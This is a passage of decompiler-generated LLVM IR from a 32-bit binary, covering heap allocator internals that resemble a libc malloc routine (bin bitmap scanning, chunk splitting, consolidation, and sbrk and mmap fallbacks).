  %v1_804ffea = load i32, i32* %edx.global-to-local, align 4
  %v3_804ffea = add i32 %v1_804ffea, %v0_804ffea
  %v4_804ffea = inttoptr i32 %v3_804ffea to i32*
  store i32 %v0_804ffea, i32* %v4_804ffea, align 4
  br label %dec_label_pc_80504ec

dec_label_pc_804fff4:                             ; preds = %dec_label_pc_804ff88, %dec_label_pc_804ff78
  %v4_804ff9f = phi i32 [ %storemerge1.pre, %dec_label_pc_804ff78 ], [ %v3_804ff8b, %dec_label_pc_804ff88 ]
  store i32 %v4_804ff9f, i32* %eax.global-to-local, align 4
  %v12_804fff4 = icmp eq i32 %v4_804ff9f, %v2_804ff7c
  %v1_804fff6 = icmp eq i1 %v12_804fff4, false
  br i1 %v1_804fff6, label %dec_label_pc_804ff88, label %dec_label_pc_804fff8.loopexit

dec_label_pc_804fff8.loopexit:                    ; preds = %dec_label_pc_804fff4
  br label %dec_label_pc_804fff8

dec_label_pc_804fff8:                             ; preds = %dec_label_pc_804fff8.loopexit, %dec_label_pc_804ff6a
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8050001 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_8050001, i32* %ecx.global-to-local, align 4
  %v2_8050004 = udiv i32 %v1_8050001, 32
  store i32 %v2_8050004, i32* @edi, align 4
  %v1_8050007 = mul nuw nsw i32 %v2_8050004, 4
  %v2_8050007 = add i32 %v1_8050007, ptrtoint (i32* @global_var_805bd54.123 to i32)
  %v3_8050007 = inttoptr i32 %v2_8050007 to i32*
  %v4_8050007 = load i32, i32* %v3_8050007, align 4
  store i32 %v4_8050007, i32* %edx.global-to-local, align 4
  %v1_805000e = mul i32 %v1_8050001, 8
  %v2_805000e = add i32 %v1_805000e, ptrtoint (i32* @global_var_805ba4c.119 to i32)
  store i32 %v2_805000e, i32* %ebx.global-to-local, align 4
  %v1_8050015 = urem i32 %v1_8050001, 32
  %v2_8050015 = icmp eq i32 %v1_8050015, 0
  store i32 %v1_8050015, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050015, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_804fff8
  %v5_8050018 = shl i32 1, %v1_8050015
  store i32 %v5_8050018, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804fff8, %bb83, %dec_label_pc_8050059
  %v1_805001a = phi i32 [ %v1_805001a.pre, %dec_label_pc_8050059 ], [ %v4_8050007, %bb83 ], [ %v4_8050007, %dec_label_pc_804fff8 ]
  %v0_805001e = phi i32 [ %v0_805001a.pre, %dec_label_pc_8050059 ], [ %v5_8050018, %bb83 ], [ 1, %dec_label_pc_804fff8 ]
  %tmp84 = icmp ule i32 %v0_805001e, %v1_805001a
  %v1_805001e = icmp eq i32 %v0_805001e, 0
  %v1_8050020 = icmp eq i1 %v1_805001e, false
  %or.cond = and i1 %tmp84, %v1_8050020
  br i1 %or.cond, label %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge, label %dec_label_pc_8050022.preheader

dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge: ; preds = %.preheader
  %v0_805004912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805004e.preheader

dec_label_pc_8050022.preheader:                   ; preds = %.preheader
  %v0_8050022.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050022

dec_label_pc_8050022:                             ; preds = %dec_label_pc_8050022.preheader, %dec_label_pc_805002c
  %v0_8050022 = phi i32 [ %v0_8050022.pre, %dec_label_pc_8050022.preheader ], [ %v1_8050022, %dec_label_pc_805002c ]
  %v1_8050022 = add i32 %v0_8050022, 1
  store i32 %v1_8050022, i32* @edi, align 4
  %v6_8050026 = icmp ugt i32 %v1_8050022, 2
  br i1 %v6_8050026, label %dec_label_pc_80500dd.loopexit, label %dec_label_pc_805002c

dec_label_pc_805002c:                             ; preds = %dec_label_pc_8050022
  %v1_805002c = mul i32 %v1_8050022, 4
  %v2_805002c = add i32 %v1_805002c, ptrtoint (i32* @global_var_805bd54.123 to i32)
  %v3_805002c = inttoptr i32 %v2_805002c to i32*
  %v4_805002c = load i32, i32* %v3_805002c, align 4
  store i32 %v4_805002c, i32* %edx.global-to-local, align 4
  %v1_8050033 = icmp eq i32 %v4_805002c, 0
  br i1 %v1_8050033, label %dec_label_pc_8050022, label %dec_label_pc_8050037

dec_label_pc_8050037:                             ; preds = %dec_label_pc_805002c
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805003e = mul i32 %v1_8050022, 256
  store i32 %v2_805003e, i32* %eax.global-to-local, align 4
  %v1_8050041 = add i32 %v2_805003e, ptrtoint (i32* @global_var_805ba4c.119 to i32)
  store i32 %v1_8050041, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805004e.preheader

dec_label_pc_805004e.preheader:                   ; preds = %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge, %dec_label_pc_8050037
  %v0_805004912 = phi i32 [ %v1_8050041, %dec_label_pc_8050037 ], [ %v0_805004912.pre, %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8050037 ], [ %v0_805001e, %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge ]
  %v0_805005f = phi i32 [ %v4_805002c, %dec_label_pc_8050037 ], [ %v1_805001a, %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge ]
  %v2_805004e4 = and i32 %v0_805005f, %esi.promoted
  %v3_805004e5 = icmp eq i32 %v2_805004e4, 0
  br i1 %v3_805004e5, label %dec_label_pc_8050049, label %dec_label_pc_8050052

dec_label_pc_8050049:                             ; preds = %dec_label_pc_805004e.preheader, %dec_label_pc_8050049
  %v2_805004c14 = phi i32 [ %v2_805004c, %dec_label_pc_8050049 ], [ %esi.promoted, %dec_label_pc_805004e.preheader ]
  %v0_805004913 = phi i32 [ %v1_8050049, %dec_label_pc_8050049 ], [ %v0_805004912, %dec_label_pc_805004e.preheader ]
  %v1_8050049 = add i32 %v0_805004913, 8
  %v2_805004c = mul i32 %v2_805004c14, 2
  %v2_805004e = and i32 %v2_805004c, %v0_805005f
  %v3_805004e = icmp eq i32 %v2_805004e, 0
  br i1 %v3_805004e, label %dec_label_pc_8050049, label %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge

dec_label_pc_805004e.dec_label_pc_8050052_crit_edge: ; preds = %dec_label_pc_8050049
  store i32 %v1_8050049, i32* %ebx.global-to-local, align 4
  store i32 %v2_805004c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050052

dec_label_pc_8050052:                             ; preds = %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge, %dec_label_pc_805004e.preheader
  %v0_8050059 = phi i32 [ %v2_805004c, %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge ], [ %esi.promoted, %dec_label_pc_805004e.preheader ]
  %v1_805007c = phi i32 [ %v1_8050049, %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge ], [ %v0_805004912, %dec_label_pc_805004e.preheader ]
  %v1_8050052 = add i32 %v1_805007c, 12
  %v2_8050052 = inttoptr i32 %v1_8050052 to i32*
  %v3_8050052 = load i32, i32* %v2_8050052, align 4
  store i32 %v3_8050052, i32* %ecx.global-to-local, align 4
  %v12_8050055 = icmp eq i32 %v3_8050052, %v1_805007c
  %v1_8050057 = icmp eq i1 %v12_8050055, false
  br i1 %v1_8050057, label %dec_label_pc_805006d, label %dec_label_pc_8050059

dec_label_pc_8050059:                             ; preds = %dec_label_pc_8050052
  %v2_805005b = mul i32 %v0_8050059, 2
  store i32 %v2_805005b, i32* %esi.global-to-local, align 4
  %v1_805005d = sub i32 -1, %v0_8050059
  store i32 %v1_805005d, i32* %eax.global-to-local, align 4
  %v2_805005f = and i32 %v0_805005f, %v1_805005d
  store i32 %v2_805005f, i32* %edx.global-to-local, align 4
  %v1_8050061 = add i32 %v3_8050052, 8
  store i32 %v1_8050061, i32* %ebx.global-to-local, align 4
  %v1_8050064 = load i32, i32* @edi, align 4
  %v2_8050064 = mul i32 %v1_8050064, 4
  %v3_8050064 = add i32 %v2_8050064, ptrtoint (i32* @global_var_805bd54.123 to i32)
  %v4_8050064 = inttoptr i32 %v3_8050064 to i32*
  store i32 %v2_805005f, i32* %v4_8050064, align 4
  %v0_805001a.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805001a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805006d:                             ; preds = %dec_label_pc_8050052
  %v1_805006d = add i32 %v3_8050052, 4
  %v2_805006d = inttoptr i32 %v1_805006d to i32*
  %v3_805006d = load i32, i32* %v2_805006d, align 4
  store i32 %v3_805006d, i32* %edx.global-to-local, align 4
  %v1_8050070 = add i32 %v3_8050052, 12
  %v2_8050070 = inttoptr i32 %v1_8050070 to i32*
  %v3_8050070 = load i32, i32* %v2_8050070, align 4
  store i32 %v3_8050070, i32* %eax.global-to-local, align 4
  %v1_8050073 = and i32 %v3_805006d, -4
  store i32 %v1_8050073, i32* %edx.global-to-local, align 4
  %v5_8050078 = sub i32 %v1_8050073, %v1_8050172
  store i32 %v5_8050078, i32* %esi.global-to-local, align 4
  store i32 %v3_8050070, i32* %v2_8050052, align 4
  %v0_805007f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805007f = load i32, i32* %eax.global-to-local, align 4
  %v2_805007f = add i32 %v1_805007f, 8
  %v3_805007f = inttoptr i32 %v2_805007f to i32*
  store i32 %v0_805007f, i32* %v3_805007f, align 4
  %v0_8050082 = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_8050082, 16
  %v0_8050087 = load i32, i32* %ecx.global-to-local, align 4
  br i1 %tmp138, label %dec_label_pc_8050087, label %dec_label_pc_805008e

dec_label_pc_8050087:                             ; preds = %dec_label_pc_805006d
  %v1_8050087 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050087 = add i32 %v0_8050087, 4
  %v3_8050087 = add i32 %v2_8050087, %v1_8050087
  %v4_8050087 = inttoptr i32 %v3_8050087 to i32*
  %v5_8050087 = load i32, i32* %v4_8050087, align 4
  %v6_8050087 = or i32 %v5_8050087, 1
  store i32 %v6_8050087, i32* %v4_8050087, align 4
  br label %dec_label_pc_80500d5

dec_label_pc_805008e:                             ; preds = %dec_label_pc_805006d
  %v2_8050092 = add i32 %v0_8050087, %v1_8050172
  store i32 %v2_8050092, i32* %eax.global-to-local, align 4
  %v1_805009b = load i32, i32* @ebp, align 4
  %v2_805009b = add i32 %v1_805009b, 8
  %v3_805009b = inttoptr i32 %v2_805009b to i32*
  store i32 %v2_8050092, i32* %v3_805009b, align 4
  %v0_805009e = load i32, i32* %eax.global-to-local, align 4
  %v1_805009e = load i32, i32* @ebp, align 4
  %v2_805009e = add i32 %v1_805009e, 12
  %v3_805009e = inttoptr i32 %v2_805009e to i32*
  store i32 %v0_805009e, i32* %v3_805009e, align 4
  %v0_80500a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80500a1 = add i32 %v0_80500a1, 8
  %v2_80500a1 = inttoptr i32 %v1_80500a1 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v2_80500a1, align 4
  %v0_80500a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80500a8 = add i32 %v0_80500a8, 12
  %v2_80500a8 = inttoptr i32 %v1_80500a8 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.121 to i32), i32* %v2_80500a8, align 4
  %v0_80500af = load i32, i32* @global_var_805ba50.120, align 16
  %v4_80500b5 = load i32, i32* %eax.global-to-local, align 4
  %v5_80500b5 = select i1 %v8_804fe1b, i32 %v4_80500b5, i32 %v0_80500af
  %v4_80500b8 = or i32 %v1_8050172, 1
  store i32 %v5_80500b5, i32* @global_var_805ba50.120, align 16
  %v0_80500c3 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_80500b8, i32* %ebx.global-to-local, align 4
  %v1_80500c9 = or i32 %v0_80500c3, 1
  store i32 %v1_80500c9, i32* %edx.global-to-local, align 4
  %v3_80500cc = add i32 %v0_80500c3, %v4_80500b5
  %v4_80500cc = inttoptr i32 %v3_80500cc to i32*
  store i32 %v0_80500c3, i32* %v4_80500cc, align 4
  %v0_80500cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80500cf = load i32, i32* %ecx.global-to-local, align 4
  %v2_80500cf = add i32 %v1_80500cf, 4
  %v3_80500cf = inttoptr i32 %v2_80500cf to i32*
  store i32 %v0_80500cf, i32* %v3_80500cf, align 4
  %v0_80500d2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80500d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80500d2 = add i32 %v1_80500d2, 4
  %v3_80500d2 = inttoptr i32 %v2_80500d2 to i32*
  store i32 %v0_80500d2, i32* %v3_80500d2, align 4
  br label %dec_label_pc_80500d5

dec_label_pc_80500d5:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_8050087, %dec_label_pc_805008e
  %v0_80500d5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80500d5 = add i32 %v0_80500d5, 8
  store i32 %v1_80500d5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80500dd.loopexit:                    ; preds = %dec_label_pc_8050022
  br label %dec_label_pc_80500dd

dec_label_pc_80500dd:                             ; preds = %dec_label_pc_80500dd.loopexit, %dec_label_pc_804fddd, %dec_label_pc_804fde5
  %v0_80500dd = load i32, i32* @global_var_805ba4c.119, align 4
  store i32 %v0_80500dd, i32* @ebx, align 4
  store i32 %v1_8050172, i32* %esi.global-to-local, align 4
  %v1_80500e7 = add i32 %v0_80500dd, 4
  %v2_80500e7 = inttoptr i32 %v1_80500e7 to i32*
  %v3_80500e7 = load i32, i32* %v2_80500e7, align 4
  %v1_80500ea = add i32 %v1_8050172, 16
  store i32 %v1_80500ea, i32* @esi, align 4
  %v1_80500f1 = and i32 %v3_80500e7, -4
  store i32 %v1_80500f1, i32* %ecx.global-to-local, align 4
  %v7_80500f4 = icmp ult i32 %v1_80500f1, %v1_80500ea
  br i1 %v7_80500f4, label %dec_label_pc_8050114, label %dec_label_pc_80500f8

dec_label_pc_80500f8:                             ; preds = %dec_label_pc_80500dd
  %v2_80500fc = add i32 %v0_80500dd, %v1_8050172
  store i32 %v2_80500fc, i32* %edx.global-to-local, align 4
  %v1_80500ff = or i32 %v1_8050172, 1
  store i32 %v1_80500ff, i32* %eax.global-to-local, align 4
  store i32 %v2_80500fc, i32* @global_var_805ba4c.119, align 4
  store i32 %v1_80500ff, i32* %v2_80500e7, align 4
  %v0_805010b = load i32, i32* %ecx.global-to-local, align 4
  %v5_805010b = sub i32 %v0_805010b, %v1_8050172
  store i32 %v5_805010b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805048d

dec_label_pc_8050114:                             ; preds = %dec_label_pc_80500dd
  %v0_8050114 = load i8, i8* @global_var_805ba20.118, align 32
  %v1_8050114 = and i8 %v0_8050114, 2
  %v2_8050114 = icmp eq i8 %v1_8050114, 0
  %v0_805011b = load i32, i32* @global_var_805bd7c.124, align 4
  store i32 %v0_805011b, i32* %edx.global-to-local, align 4
  br i1 %v2_8050114, label %dec_label_pc_8050148, label %dec_label_pc_8050123

dec_label_pc_8050123:                             ; preds = %dec_label_pc_8050114
  store i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32* %stack_var_-92, align 4
  %v2_805012b = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805ba20.118 to i32*))
  store i32 ptrtoint (i8* @global_var_805ba20.118 to i32), i32* @ebx, align 4
  %v1_8050135 = add i32 %v1_8050172, -7
  store i32 %v1_8050135, i32* %eax.global-to-local, align 4
  store i32 %v1_8050135, i32* %stack_var_-92, align 4
  %v1_8050139 = call i32 @malloc(i32 %v1_8050135)
  store i32 %v1_8050139, i32* %eax.global-to-local, align 4
  store i32 %v1_8050139, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_8050148:                             ; preds = %dec_label_pc_8050114
  store i32 %v1_8050172, i32* @ebx, align 4
  %v1_805014c = add i32 %v0_805011b, -1
  store i32 %v1_805014c, i32* %ecx.global-to-local, align 4
  %v1_805014f = load i32, i32* @global_var_805bd6c.125, align 4
  %v7_805014f = icmp ult i32 %v1_8050172, %v1_805014f
  br i1 %v7_805014f, label %dec_label_pc_805022a, label %dec_label_pc_805015f

dec_label_pc_805015f:                             ; preds = %dec_label_pc_8050148
  %v0_805015f = load i32, i32* @global_var_805bd70.126, align 16
  store i32 %v0_805015f, i32* %eax.global-to-local, align 4
  %v1_8050164 = load i32, i32* @global_var_805bd74.127, align 4
  %v5_805016a = icmp slt i32 %v0_805015f, %v1_8050164
  br i1 %v5_805016a, label %dec_label_pc_8050170, label %dec_label_pc_805022a

dec_label_pc_8050170:                             ; preds = %dec_label_pc_805015f
  %v2_8050172 = add i32 %v1_8050172, 10
  %v3_8050172 = add i32 %v2_8050172, %v0_805011b
  %v1_8050176 = sub i32 0, %v0_805011b
  store i32 %v1_8050176, i32* %eax.global-to-local, align 4
  %v2_8050178 = and i32 %v3_8050172, %v1_8050176
  store i32 %v2_8050178, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8050178, %v1_8050172
  br i1 %tmp139, label %dec_label_pc_8050184, label %dec_label_pc_805022a

dec_label_pc_8050184:                             ; preds = %dec_label_pc_8050170
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050191 = call i32 @mmap(i32 0, i32 %v2_8050178, i32 3, i32 34, i32 0, i32 0, i32 %v1_805014c, i32 %v1_805014c)
  store i32 %v8_8050191, i32* %eax.global-to-local, align 4
  %v10_8050199 = icmp eq i32 %v8_8050191, -1
  store i32 %v8_8050191, i32* %edx.global-to-local, align 4
  br i1 %v10_8050199, label %dec_label_pc_8050184.dec_label_pc_805022a_crit_edge, label %dec_label_pc_80501a4

dec_label_pc_8050184.dec_label_pc_805022a_crit_edge: ; preds = %dec_label_pc_8050184
  %v0_805022a.pre = load i32, i32* @global_var_805ba4c.119, align 4
  br label %dec_label_pc_805022a

dec_label_pc_80501a4:                             ; preds = %dec_label_pc_8050184
  %v1_80501a6 = urem i32 %v8_8050191, 8
  %v2_80501a6 = icmp eq i32 %v1_80501a6, 0
  store i32 %v1_80501a6, i32* %ecx.global-to-local, align 4
  br i1 %v2_80501a6, label %dec_label_pc_80501bf, label %dec_label_pc_80501ab

dec_label_pc_80501ab:                             ; preds = %dec_label_pc_80501a4
  %v0_80501b0 = load i32, i32* @ebx, align 4
  %v2_80501b2 = sub nsw i32 8, %v1_80501a6
  store i32 %v2_80501b2, i32* %eax.global-to-local, align 4
  %v2_80501b4 = add i32 %v2_80501b2, %v8_8050191
  store i32 %v2_80501b4, i32* %ecx.global-to-local, align 4
  %v2_80501b7 = sub i32 %v0_80501b0, %v2_80501b2
  store i32 %v2_80501b7, i32* %esi.global-to-local, align 4
  %v2_80501b9 = inttoptr i32 %v2_80501b4 to i32*
  store i32 %v2_80501b2, i32* %v2_80501b9, align 4
  br label %dec_label_pc_80501c9

dec_label_pc_80501bf:                             ; preds = %dec_label_pc_80501a4
  store i32 %v8_8050191, i32* %ecx.global-to-local, align 4
  %v1_80501c1 = inttoptr i32 %v8_8050191 to i32*
  store i32 0, i32* %v1_80501c1, align 4
  br label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501ab, %dec_label_pc_80501bf
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_80501ab ], [ @ebx, %dec_label_pc_80501bf ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_80501c9 = or i32 %storemerge, 2
  %v1_80501cc = load i32, i32* %ecx.global-to-local, align 4
  %v2_80501cc = add i32 %v1_80501cc, 4
  %v3_80501cc = inttoptr i32 %v2_80501cc to i32*
  store i32 %v1_80501c9, i32* %v3_80501cc, align 4
  %v0_80501cf = load i32, i32* @global_var_805bd70.126, align 16
  %v0_80501d4 = load i32, i32* @global_var_805bd90.128, align 16
  %v1_80501da = add i32 %v0_80501cf, 1
  %v1_80501db = load i32, i32* @global_var_805bd78.129, align 8
  %v2_80501db = sub i32 %v1_80501da, %v1_80501db
  %v8_80501db = xor i32 %v1_80501db, %v1_80501da
  %v9_80501db = xor i32 %v2_80501db, %v1_80501da
  %v10_80501db = and i32 %v9_80501db, %v8_80501db
  %v11_80501db = icmp slt i32 %v10_80501db, 0
  %v12_80501db = icmp eq i32 %v2_80501db, 0
  %v13_80501db = icmp slt i32 %v2_80501db, 0
  store i32 %v1_80501da, i32* @global_var_805bd70.126, align 16
  %v3_80501e6 = icmp ne i1 %v13_80501db, %v11_80501db
  %v4_80501e6 = or i1 %v12_80501db, %v3_80501e6
  %v7_80501e6 = select i1 %v4_80501e6, i32 %v1_80501db, i32 %v1_80501da
  store i32 %v7_80501e6, i32* @global_var_805bd78.129, align 8
  %v0_80501f2 = load i32, i32* @global_var_805bd84.130, align 4
  %v1_80501f7 = load i32, i32* @ebx, align 4
  %v2_80501f7 = add i32 %v1_80501f7, %v0_80501f2
  store i32 %v2_80501f7, i32* @global_var_805bd84.130, align 4
  %tmp86 = icmp ule i32 %v2_80501f7, %v0_80501d4
  %v5_8050204 = select i1 %tmp86, i32 %v0_80501d4, i32 %v2_80501f7
  store i32 %v5_8050204, i32* %edx.global-to-local, align 4
  %v1_8050207 = load i32, i32* @global_var_805bd88.131, align 8
  %v2_8050207 = add i32 %v1_8050207, %v2_80501f7
  store i32 %v5_8050204, i32* @global_var_805bd90.128, align 16
  %v1_8050213 = load i32, i32* @global_var_805bd94.132, align 4
  %tmp140 = icmp ule i32 %v2_8050207, %v1_8050213
  %v5_8050219 = select i1 %tmp140, i32 %v1_8050213, i32 %v2_8050207
  store i32 %v5_8050219, i32* %eax.global-to-local, align 4
  store i32 %v5_8050219, i32* @global_var_805bd94.132, align 4
  br label %dec_label_pc_80500d5

dec_label_pc_805022a:                             ; preds = %dec_label_pc_8050170, %dec_label_pc_8050184.dec_label_pc_805022a_crit_edge, %dec_label_pc_805015f, %dec_label_pc_8050148
  %v0_805022a = phi i32 [ %v0_805022a.pre, %dec_label_pc_8050184.dec_label_pc_805022a_crit_edge ], [ %v0_80500dd, %dec_label_pc_805015f ], [ %v0_80500dd, %dec_label_pc_8050170 ], [ %v0_80500dd, %dec_label_pc_8050148 ]
  store i32 %v0_805022a, i32* %eax.global-to-local, align 4
  %v1_8050233 = add i32 %v0_805022a, 4
  %v2_8050233 = inttoptr i32 %v1_8050233 to i32*
  %v3_8050233 = load i32, i32* %v2_8050233, align 4
  %v1_805023a = and i32 %v3_8050233, -4
  %v2_805023a = icmp eq i32 %v1_805023a, 0
  store i32 %v1_805023a, i32* @ebp, align 4
  %v1_8050240 = load i32, i32* @global_var_805bd68.133, align 8
  %v0_805024a = load i8, i8* @global_var_805bd80.134, align 128
  %v1_805024a = urem i8 %v0_805024a, 2
  %v2_805024a = icmp eq i8 %v1_805024a, 0
  %v1_8050251 = icmp eq i1 %v2_805024a, false
  %v1_805023a.op = sub i32 0, %v1_805023a
  %v2_8050248.neg = select i1 %v1_8050251, i32 %v1_805023a.op, i32 0
  %v2_8050240 = add i32 %v1_805014c, %v1_80500ea
  %v4_8050251 = add i32 %v2_8050240, %v1_8050240
  %v5_8050258 = add i32 %v4_8050251, %v2_8050248.neg
  store i32 %v5_8050258, i32* %eax.global-to-local, align 4
  %v1_805025c = sub i32 0, %v0_805011b
  store i32 %v1_805025c, i32* %edx.global-to-local, align 4
  %v2_8050260 = and i32 %v5_8050258, %v1_805025c
  store i32 %v2_8050260, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_8050260, 1
  br i1 %tmp87, label %dec_label_pc_805027e, label %dec_label_pc_8050268

dec_label_pc_8050268:                             ; preds = %dec_label_pc_805022a
  store i32 %v2_8050260, i32* %stack_var_-92, align 4
  %v1_805026c = call i32 @__GI_sbrk(i32 %v2_8050260)
  store i32 %v1_805026c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v10_8050277 = icmp eq i32 %v1_805026c, -1
  store i32 %v1_805026c, i32* @ebx, align 4
  %v1_805027c = icmp eq i1 %v10_8050277, false
  br i1 %v1_805027c, label %dec_label_pc_80502d5, label %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge

dec_label_pc_8050268.dec_label_pc_805027e_crit_edge: ; preds = %dec_label_pc_8050268
  %v0_805027e.pre = load i8, i8* @global_var_805bd80.134, align 128
  br label %dec_label_pc_805027e

dec_label_pc_805027e:                             ; preds = %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge, %dec_label_pc_805022a
  %v0_80502ab = phi i32 [ -1, %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge ], [ %v1_805025c, %dec_label_pc_805022a ]
  %v0_805027e = phi i8 [ %v0_805027e.pre, %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge ], [ %v0_805024a, %dec_label_pc_805022a ]
  %v1_805027e = urem i8 %v0_805027e, 2
  %v2_805027e = icmp eq i8 %v1_805027e, 0
  br i1 %v2_805027e, label %dec_label_pc_805027e.dec_label_pc_8050293_crit_edge, label %dec_label_pc_8050287

dec_label_pc_805027e.dec_label_pc_8050293_crit_edge: ; preds = %dec_label_pc_805027e
  %v0_8050293.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050293

dec_label_pc_8050287:                             ; preds = %dec_label_pc_805027e
  %v2_805028b = add i32 %v1_805023a, %v1_805014c
  store i32 %v2_805028b, i32* %eax.global-to-local, align 4
  %v0_805028d = load i32, i32* @esi, align 4
  %v2_805028d = add i32 %v0_805028d, %v2_805028b
  %v5_805028f = and i32 %v2_805028d, %v1_805025c
  store i32 %v5_805028f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050293

dec_label_pc_8050293:                             ; preds = %dec_label_pc_805027e.dec_label_pc_8050293_crit_edge, %dec_label_pc_8050287
  %v3_805029e = phi i32 [ %v0_8050293.pre, %dec_label_pc_805027e.dec_label_pc_8050293_crit_edge ], [ %v5_805028f, %dec_label_pc_8050287 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_805029e, 1048576
  %v5_805029e = select i1 %tmp88, i32 1048576, i32 %v3_805029e
  store i32 %v5_805029e, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_805029e, %v1_8050172
  br i1 %tmp141, label %dec_label_pc_80502ab, label %dec_label_pc_80504f0

dec_label_pc_80502ab:                             ; preds = %dec_label_pc_8050293
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80502b8 = call i32 @mmap(i32 0, i32 %v5_805029e, i32 3, i32 34, i32 0, i32 0, i32 %v0_80502ab, i32 %v0_80502ab)
  store i32 %v8_80502b8, i32* %eax.global-to-local, align 4
  %v10_80502c0 = icmp eq i32 %v8_80502b8, -1
  store i32 %v8_80502b8, i32* @ebx, align 4
  br i1 %v10_80502c0, label %dec_label_pc_80504f0, label %dec_label_pc_80502cb

dec_label_pc_80502cb:                             ; preds = %dec_label_pc_80502ab
  %v0_80502cb = load i8, i8* @global_var_805bd80.134, align 1
  %v2_80502cb = and i8 %v0_80502cb, -2
  store i8 %v2_80502cb, i8* @global_var_805bd80.134, align 128
  %v1_80502d2 = load i32, i32* @esi, align 4
  %v2_80502d2 = add i32 %v1_80502d2, %v8_80502b8
  store i32 %v2_80502d2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502d5

dec_label_pc_80502d5:                             ; preds = %dec_label_pc_8050268, %dec_label_pc_80502cb
  %v0_805039c = phi i32 [ -1, %dec_label_pc_8050268 ], [ %v2_80502d2, %dec_label_pc_80502cb ]
  %v0_80503aa = phi i32 [ %v1_805026c, %dec_label_pc_8050268 ], [ %v8_80502b8, %dec_label_pc_80502cb ]
  %v10_80502d5 = icmp eq i32 %v0_80503aa, -1
  br i1 %v10_80502d5, label %dec_label_pc_80504f0, label %dec_label_pc_80502de

dec_label_pc_80502de:                             ; preds = %dec_label_pc_80502d5
  %v0_80502e2 = load i32, i32* @global_var_805bd88.131, align 8
  %v1_80502e2 = load i32, i32* @esi, align 4
  %v2_80502e2 = add i32 %v1_80502e2, %v0_80502e2
  store i32 %v2_80502e2, i32* @global_var_805bd88.131, align 8
  %v2_80502e8 = add i32 %v1_805023a, %v0_805022a
  store i32 %v2_80502e8, i32* %ecx.global-to-local, align 4
  %v2_80502ea = sub i32 %v0_80503aa, %v2_80502e8
  %v7_80502ea = icmp ult i32 %v0_80503aa, %v2_80502e8
  %v12_80502ea = icmp eq i32 %v2_80502ea, 0
  %v1_80502ec = icmp eq i1 %v12_80502ea, false
  br i1 %v1_80502ec, label %dec_label_pc_8050305, label %dec_label_pc_80502ee

dec_label_pc_80502ee:                             ; preds = %dec_label_pc_80502de
  %v10_80502ee = icmp eq i32 %v0_805039c, -1
  %v1_80502f1 = icmp eq i1 %v10_80502ee, false
  br i1 %v1_80502f1, label %dec_label_pc_8050305, label %dec_label_pc_80502f3

dec_label_pc_80502f3:                             ; preds = %dec_label_pc_80502ee
  store i32 %v0_805022a, i32* %ecx.global-to-local, align 4
  %v2_80502f7 = add i32 %v1_80502e2, %v1_805023a
  %v1_80502fa = or i32 %v2_80502f7, 1
  store i32 %v1_80502fa, i32* %eax.global-to-local, align 4
  store i32 %v1_80502fa, i32* %v2_8050233, align 4
  br label %dec_label_pc_8050432

dec_label_pc_8050305:                             ; preds = %dec_label_pc_80502ee, %dec_label_pc_80502de
  %v0_8050305 = load i8, i8* @global_var_805bd80.134, align 1
  %v1_8050305 = sext i8 %v0_8050305 to i32
